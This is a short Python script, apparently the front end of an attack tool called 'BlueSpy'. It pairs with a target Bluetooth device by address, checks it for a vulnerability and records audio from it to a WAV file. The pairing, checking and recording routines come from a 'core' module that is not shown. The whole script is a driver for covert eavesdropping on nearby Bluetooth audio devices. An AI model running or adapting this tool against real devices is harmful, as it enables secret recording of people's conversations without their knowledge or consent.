#!/usr/bin/env python3
import argparse
from core import connect_device, record, BluezTarget, is_vulnerable
import time

def main():
    parser = argparse.ArgumentParser(
        prog="BlueSpy",
        description="Record audio from paired Bluetooth device",
    )
    parser.add_argument("-a", "--target-address", required=True, dest="address")
    parser.add_argument("-f", "--file", dest="outfile", default="recording.wav")
    parser.add_argument("-v", "--verbose", action="store_true", default=False)
    args = parser.parse_args()

    target = BluezTarget(args.address)

    # Pair and connect
    paired = connect_device(target, verbose=args.verbose)
    if not paired:
        print(f"[!] Failed to connect to {target.address}")
        return

    # Check vulnerability
    vulnerable = is_vulnerable(target, verbose=args.verbose)
    print(f"[i] Device vulnerable: {'Yes' if vulnerable else 'No'}")

    # Record audio
    print("[i] Starting recording...")
    record(target, outfile=args.outfile, verbose=args.verbose)
    print(f"[i] Recording saved to {args.outfile}")

if __name__ == "__main__":
    main()
